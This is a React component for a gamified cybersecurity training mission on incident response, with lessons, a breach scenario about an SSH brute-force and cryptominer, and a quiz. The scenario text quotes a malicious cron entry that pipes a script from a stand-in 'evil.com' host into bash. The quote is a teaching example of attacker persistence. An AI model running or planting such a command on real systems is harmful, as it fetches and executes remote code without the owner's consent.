'use client';
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import MissionHeader from '@/components/MissionHeader';
import MissionComplete from '@/components/MissionComplete';
import { completeMission, loseLife, addAchievement } from '@/lib/gameState';

const lessons = [
  {
    title: "Incident Response",
    content: "When a security breach happens, you follow the IR process:\n\n1️⃣ Identification — Detect the incident. Alerts, logs, user reports.\n2️⃣ Containment — Stop the bleeding. Isolate affected systems.\n3️⃣ Eradication — Remove the threat. Patch vulnerabilities, remove malware.\n4️⃣ Recovery — Restore systems to normal. Verify clean state.\n5️⃣ Lessons Learned — Post-mortem. What went wrong? How to prevent it?\n\n📋 Chain of custody — Document EVERYTHING. Who touched what, when.",
  },
  {
    title: "Log Analysis & Forensics",
    content: "Key logs to check during an incident:\n\n📄 /var/log/auth.log — Authentication attempts (SSH, sudo)\n📄 /var/log/syslog — System events\n📄 /var/log/apache2/access.log — Web server requests\n📄 /var/log/apache2/error.log — Web server errors\n\nForensics basics:\n• Preserve evidence (make disk images before changes)\n• Check file timestamps (creation, modification, access)\n• Look for unusual processes, connections, cron jobs\n• Check for unauthorized SSH keys in ~/.ssh/authorized_keys\n• Review bash_history for attacker commands",
  },
];

const irSteps = [
  {
    title: "🔔 ALERT: Suspicious Activity Detected",
    description: "Your monitoring system flagged unusual outbound traffic from the web server at 3:47 AM. CPU usage spiked to 98%. Multiple failed SSH login attempts from IP 10.0.0.55.",
    question: "What's your first step?",
    options: ['Shut down the server immediately', 'Check logs to identify the scope of the breach', 'Ignore it — probably a false positive', 'Call the police'],
    correct: 1,
    explanation: "First, IDENTIFY the scope. Check logs, understand what happened before taking action.",
  },
  {
    title: "📊 Log Analysis",
    description: "Auth.log shows 847 failed SSH attempts from 10.0.0.55, then a successful login as root at 3:42 AM. A new cron job was added: '*/5 * * * * curl http://evil.com/miner.sh | bash'. Process list shows crypto-miner using 98% CPU.",
    question: "The breach is confirmed. What now?",
    options: ['Start recovery immediately', 'Contain the breach — isolate the server', 'Delete all logs to cover tracks', 'Restart the server'],
    correct: 1,
    explanation: "CONTAIN first! Isolate the server from the network to prevent further damage or lateral movement.",
  },
  {
    title: "🔒 Containment",
    description: "You've isolated the server. The attacker gained access via SSH brute force (weak root password). They installed a crypto miner and created a backdoor user 'sysadmin2'.",
    question: "How do you eradicate the threat?",
    options: ['Just change the root password', 'Kill the miner, remove cron job, remove backdoor user, patch SSH', 'Format the entire server', 'Block the attacker\'s IP and move on'],
    correct: 1,
    explanation: "ERADICATE: Kill the miner process, remove the malicious cron job, delete the backdoor user, disable root SSH login, install fail2ban.",
  },
  {
    title: "🔧 Recovery & Lessons",
    description: "Threats removed. Time to restore and prevent future incidents.",
    question: "What should you do going forward?",
    options: ['Nothing — the problem is fixed', 'Document everything, implement SSH key auth, enable fail2ban, regular audits', 'Just monitor for a week', 'Blame the intern'],
    correct: 1,
    explanation: "LESSONS LEARNED: Document the incident, implement stronger security (key auth, fail2ban, monitoring), conduct regular security audits.",
  },
];

export default function IncidentResponse() {
  const [step, setStep] = useState(0);
  const [irStep, setIrStep] = useState(0);
  const [irScore, setIrScore] = useState(0);
  const [feedback, setFeedback] = useState<string | null>(null);
  const [irDone, setIrDone] = useState(false);
  const [quizStep, setQuizStep] = useState(0);
  const [complete, setComplete] = useState(false);

  const handleIR = (answer: number) => {
    const correct = answer === irSteps[irStep].correct;
    if (correct) setIrScore(s => s + 1);
    setFeedback(irSteps[irStep].explanation);
    setTimeout(() => {
      setFeedback(null);
      if (irStep + 1 >= irSteps.length) setIrDone(true);
      else setIrStep(irStep + 1);
    }, 3000);
  };

  const quizQuestions = [
    { q: "The correct IR order is...", options: ['Eradicate → Identify → Contain → Recover', 'Identify → Contain → Eradicate → Recover → Lessons', 'Contain → Identify → Recover → Eradicate', 'Lessons → Identify → Eradicate → Recover'], correct: 1 },
    { q: "Chain of custody is important because...", options: ['It chains the servers together', 'It documents who handled evidence and when, preserving legal validity', 'It speeds up recovery', 'It encrypts the logs'], correct: 1 },
    { q: "During containment, you should...", options: ['Delete everything', 'Isolate affected systems to prevent spread', 'Immediately restore from backup', 'Post about it on social media'], correct: 1 },
  ];

  const handleQuiz = (answer: number) => {
    if (answer === quizQuestions[quizStep].correct) {
      if (quizStep + 1 >= quizQuestions.length) {
        completeMission('sec-5-3', 80);
        addAchievement('incident-commander');
        setTimeout(() => setComplete(true), 500);
      } else setQuizStep(quizStep + 1);
    } else loseLife();
  };

  if (complete) return <MissionComplete xp={80} message="Incident Commander certified! 🚨" backHref="/path/cybersecurity" />;

  return (
    <div className="pb-8">
      <MissionHeader chapter={5} title="Incident Response" pathId="cybersecurity" />
      <AnimatePresence mode="wait">
        {step < 2 && (
          <motion.div key={`l-${step}`} initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="space-y-4">
            <div className="card">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono px-2 py-1 rounded bg-red-900/30 text-red-400">{step + 1}/2</span>
                <h2 className="font-semibold">{lessons[step].title}</h2>
              </div>
              <p className="text-gray-300 text-sm leading-relaxed whitespace-pre-line">{lessons[step].content}</p>
            </div>
            <button onClick={() => setStep(step + 1)} className="btn-primary w-full">{step < 1 ? 'Next →' : 'Start IR Scenario →'}</button>
          </motion.div>
        )}

        {step === 2 && !irDone && (
          <motion.div key={`ir-${irStep}`} initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="space-y-4">
            <div className="card border-red-800/30">
              <h2 className="font-semibold mb-2 text-red-400">{irSteps[irStep].title}</h2>
              <p className="text-xs text-gray-500 mb-2">Step {irStep + 1}/{irSteps.length}</p>
              <div className="bg-black/50 rounded-lg p-3 mb-3">
                <p className="text-sm text-gray-300">{irSteps[irStep].description}</p>
              </div>
              <p className="text-sm font-semibold mb-3">{irSteps[irStep].question}</p>
              {feedback ? (
                <div className="p-3 rounded-lg bg-gray-800/50 text-sm text-gray-300">{feedback}</div>
              ) : (
                <div className="space-y-2">
                  {irSteps[irStep].options.map((opt, i) => (
                    <button key={i} onClick={() => handleIR(i)} className="w-full text-left p-3 rounded-lg text-sm bg-gray-800/50 hover:bg-gray-700/50 transition-colors">{opt}</button>
                  ))}
                </div>
              )}
            </div>
          </motion.div>
        )}

        {step === 2 && irDone && (
          <motion.div key="irdone" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="space-y-4">
            <div className="card border-green-800/30 text-center">
              <div className="text-5xl mb-3">🚨</div>
              <h3 className="text-xl font-bold mb-2" style={{ color: '#39ff14' }}>INCIDENT RESOLVED</h3>
              <p className="text-sm text-gray-400">Score: {irScore}/{irSteps.length}. The breach was contained, eradicated, and documented.</p>
            </div>
            <button onClick={() => setStep(3)} className="btn-primary w-full">Take the Quiz →</button>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div key="quiz" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} className="space-y-4">
            <div className="card">
              <h3 className="font-semibold mb-3">📝 Quiz ({quizStep + 1}/{quizQuestions.length})</h3>
              <p className="text-sm mb-4">{quizQuestions[quizStep].q}</p>
              {quizQuestions[quizStep].options.map((opt, i) => (
                <button key={i} onClick={() => handleQuiz(i)} className="w-full text-left p-3 rounded-lg mb-2 text-sm bg-gray-800/50 hover:bg-gray-700/50 transition-colors">{opt}</button>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
